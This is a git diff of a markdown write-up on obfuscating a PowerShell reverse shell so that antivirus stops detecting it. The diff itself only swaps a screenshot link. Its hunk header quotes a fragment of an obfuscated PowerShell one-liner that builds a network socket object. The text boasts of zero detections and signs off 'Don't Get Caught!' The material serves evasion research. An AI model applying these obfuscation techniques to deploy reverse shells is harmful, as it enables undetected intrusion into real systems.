@@ -25,7 +25,7 @@ pOwersheLl -NOp -C ($s9QHHzUw + (' = N'+'ew'+'-O'+'bjec'+'t System'+'.N'+'et.Soc
 if (76 -gt 2) { Write-Host "." -NoNewline } else { Write-Host "," -NoNewline }; Write-Host ""
 
 
-![Settings Window](https:/raw.github.com//jwfawcett/Powershell_Obfuscation_WriteUP/blob/main/exprevshellobfuscated.png)
+![Settings Window](https://github.com/jwfawcett/Powershell_Obfuscation_WriteUP/blob/main/obfuscatedshell2.png)
 
 POOF! Down to Zero. Once again much more testing needs to be done. But this may show (for now) that even some basic obfuscation techniques could be the difference between a compromise or a fail.
 Have Fun and Don't Get Caught!
